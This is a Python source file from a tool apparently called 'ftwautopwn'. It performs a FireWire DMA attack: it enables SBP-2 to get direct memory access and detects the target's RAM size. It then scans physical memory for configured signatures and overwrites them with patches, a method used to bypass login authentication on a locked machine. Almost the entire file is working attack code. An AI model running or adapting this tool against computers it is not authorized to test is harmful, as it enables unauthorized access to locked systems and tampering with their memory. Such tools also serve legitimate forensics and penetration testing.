'''
Created on Jun 23, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
'''
from binascii import hexlify
from forensic1394 import Bus
from ftwautopwn.util import msg, Context, clean_hex, all_equal
from time import sleep

import sys
import math
import collections
import ftwautopwn.settings as settings
from pprint import pprint

class Method(object):
    '''
    classdocs
    '''


    def __init__(self, name, notes, phases):
        '''
        Constructor
        '''
        self.notes = notes
        self.name = name
        self.phases = phases
        

class Patch:
    '''
    classdocs
    '''


    def __init__(self, sig, patch, offset):
        '''
        Constructor
        '''
        self.sig = sig
        self.patch = patch
        self.offset = offset
        
    def set_sig(self, value):
        self._sig = clean_hex(value)
    
    def get_sig(self):
        return self._sig
    
    sig = property(get_sig, set_sig)
    
    def set_patch(self, value):
        self._patch = clean_hex(value)
    
    def get_patch(self):
        return self._patch
    
    patch = property(get_patch, set_patch)
    
    def set_offset(self, value):
        self._offset = int(value, 0)
    
    def get_offset(self):
        return self._offset
    
    offset = property(get_offset, set_offset)

class MemoryFile:
    '''
    classdocs
    '''

    def __init__(self, file_name, pagesize):
        '''
        Constructor
        '''
        self.file = open(file_name, mode='rb')
        self.pagesize = pagesize
    
    def read(self, addr, numb, buf=None):
        self.file.seek(addr)
        return self.file.read(numb)  
    
    def readv(self, req):
        for r in req:
            self.file.seek(r[0])
            yield (r[0], self.file.read(r[1]))
    
    def write(self, addr, buf):
        '''
        For now, dummy method in order to simulate a write
        '''
        msg('!', 'Write to file not supported at the moment.')
        pass
        

def run(context):
    global ctx
    ctx = context
    config = ctx.config
    enc = ctx.encoding
    
    methods = populate_methods(config)
    
    # Select target unless already supplied by user
    if not ctx.target:
        list_targets(methods)
        ctx.target = select_target(methods, False)

    # Print phase, method and patch parameters
    msg('+', 'You have selected: ' + ctx.target.name)
    phases = ctx.target.phases
    one_phase = False
    if len(phases) == 1: one_phase = True
    for i, phase in enumerate(phases):
        if not one_phase: print('    Phase ' + str(i + 1) + ':')
        print('        Using signature: 0x' + hexlify(phase.sig).decode(enc))
        print('        Using patch:     0x' + hexlify(phase.patch).decode(enc))
        print('        Using offset:    ' + hex(phase.offset) + ' (' + str(phase.offset) + ')')
    
    # Initialize
    d = None
    if ctx.file_mode:
        d = MemoryFile(ctx.file_name, ctx.PAGESIZE)
    else:
        d = initialize_fw(d)
    
    # Find memory size
    msg('*', 'Detecting memory size...')
    memsize = findmemsize(d)
    if not memsize:
        fail('Could not determine memory size. Try increasing the delay after enabling SBP2 (-d switch)')
    else:
        ctx.memsize = memsize
        print('   {0} MiB main memory detected'.format(int(ctx.memsize/(1024 * 1024))))
    
    # Attack
    msg('+', 'Starting attack...')
    for i, phase in enumerate(phases):
        try:
            # Find
            if not one_phase: msg('+', 'Phase ' + str(i + 1) + ':')
            addr = findsig(d, phase.sig, phase.offset, ctx.memsize)
            if not addr:
                settings.success = False
                continue
            msg('+', 'Signature found at 0x%x.' % addr)
            # Patch and verify if not dry run
            if not ctx.dry_run:
                d.write(addr, phase.patch)
                if d.read(addr, len(phase.patch)) == phase.patch:
                    msg('+', 'Write-back verified; patching successful.')
                else:
                    msg('-', 'Write-back could not be verified; patching unsuccessful.')
                    #s._success = False
        except IOError:
            print('-', 'I/O Error, make sure FireWire interfaces are properly connected.')
            settings.success = False
        #if not s._success:
        #    break
        
    if not settings.success:
        fail('Signature not found.')


def findmemsize(d):
    mb = 1024 * 1024 # One MB
    # Iterate through possible memory sizes and check if we get data when reading
    step = 128 * mb
    fwmax = 4096 * mb
    chunk = ctx.PAGESIZE # Read page sized chunks of data
    for addr in range(fwmax, 0, -step):
        buf = d.read(addr - chunk, chunk)
        if buf:
            if ctx.verbose: msg('*', 'Found memory size:' + str(addr/mb) + ' MB')
            return addr
    return None


def list_targets(methods):
    print()
    msg('+', 'Available targets:')
    for i, method in enumerate(methods):
        msg(str(i + 1), method.name)
        if ctx.verbose: print('\t' + method.notes)
    print()


def populate_methods(config):
    # Populate list with methods from config file
    methods = list()
    
    # Check that the config file contains targets
    if not config.sections():
        fail('No configurated targets in config file.')
    
    for method_name in config.sections():
        # Generate lists of corresponding sigs, phases and offsets
        notes = config.get(method_name, 'notes')
        sigs = config.get(method_name, 'signature').split(':')
        patches = config.get(method_name, 'patch').split(':')
        pageoffsets = config.get(method_name, 'pageoffset').split(':')

        if (len(sigs) != len(patches) or \
            len(patches) != len(pageoffsets)):
            msg('!', 'Uneven number of signatures, phases and page ' 
                      'offsets in section %s of configuration file.' 
                      % method_name)
            sys.exit(1)

        # Populate phases for the given method
        p = list()
        for j in range(len(sigs)):
            p.append(Patch(sigs[j], patches[j], pageoffsets[j]))
        
        # Add phases to the method
        methods.append(Method(method_name, notes, p))
    
    return methods


def select_target(methods, selected):
    if not selected: selected = input('Please select target (or enter \'q\' to quit): ')
    nof_targets = len(methods)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            msg('!', 'Invalid selection, please try again. Type \'q\' to quit.')
            return select_target(methods, False)
    if selected <= nof_targets: return methods[selected - 1]
    else:
        msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit.')
        return select_target(methods, False)
    

def initialize_fw(d):
    b = Bus()
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    try:
        for i in range(ctx.fw_delay, 0, -1):
            sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C\r' % i)
            sys.stdout.flush()
            sleep(1)
    except KeyboardInterrupt:
        msg('!', 'Interrupted')
        pass
    # Open the first device
    d = b.devices()[0]
    d.open()
    print()
    return d


def findsig(d, sig, off, memsize):
    # Skip the first 1 MiB of memory
    one_mb = 1 * 1024 * 1024
    addr = one_mb + off
    # An array to store the last read values of data so that we can assess if
    # we're sucking data through the wire or not
    buf = collections.deque(ctx.buflen * [0], ctx.buflen)

    while addr < memsize:
        # Prepare a batch of 128 requests
        r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
        for caddr, cand  in d.readv(r):
            if cand == sig: 
                print()
                return caddr
        mibaddr = math.floor((addr + one_mb) / (one_mb)) # Account for the first MiB
        sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
        if ctx.verbose:
            sys.stdout.write(' Data read: 0x{0}'.format(hexlify(cand).decode(ctx.encoding)))
        
        sys.stdout.write('\r')
        sys.stdout.flush()
        
        # Append read data to buffer, and check if the all entries in the buffer
        # is equal. If they are, we're likely not getting data
        buf.appendleft(cand)
        if all_equal(buf):
            print()
            cont = input('[-] Looks like we\'re not getting any data. We ' \
                         'could be outside memory\n    boundaries, or simply ' \
                         'not have DMA. Try using -v/--verbose to debug.\n    '\
                         'Continue? [Y/n]: ')
            if cont == 'n':
                fail()
            else: # Double the buffer
                buf = collections.deque(buf.maxlen * 2 * [0], buf.maxlen * 2)
        
        addr += ctx.PAGESIZE * 128
    print()
    return


def fail(string = None):
    if string: msg('!', string)
    print('[!] Attack unsuccessful.')
    sys.exit(1)